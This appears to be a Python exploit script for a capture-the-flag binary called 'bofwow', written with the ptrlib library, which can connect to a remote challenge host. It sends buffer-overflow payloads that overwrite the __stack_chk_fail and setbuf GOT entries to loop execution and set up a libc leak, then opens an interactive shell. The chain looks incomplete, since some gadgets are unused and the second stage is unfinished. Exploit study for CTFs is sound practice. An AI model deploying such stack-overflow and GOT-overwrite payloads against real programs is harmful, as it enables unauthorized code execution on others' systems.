#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./bofwow_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.35.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "94.237.60.228:46774"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def send(data: bytes):
        io.sendlineafter("What is your first name? ", data)
        io.sendlineafter("How old are you? ", b"0")
        return

    main = 0x4013A5
    input_person = 0x4012D6
    __stack_chk_fail = 0x404048
    setbuf = 0x404060  # for leaking libc
    pop_rbp = next(exe.gadget("pop rbp; ret;"))
    bss = unwrap(exe.section(".bss"))

    pl = ptr.p64(main)
    pl = pl.ljust(0x130, b"A")
    pl += ptr.p64(__stack_chk_fail)
    send(pl)

    pl2 = ptr.p64(0)
    pl2 = pl2.ljust(0x130, b"B")
    pl2 += ptr.p64(setbuf)
    input("> ")
    send(pl2)

    io.sh()


if __name__ == "__main__":
    main()
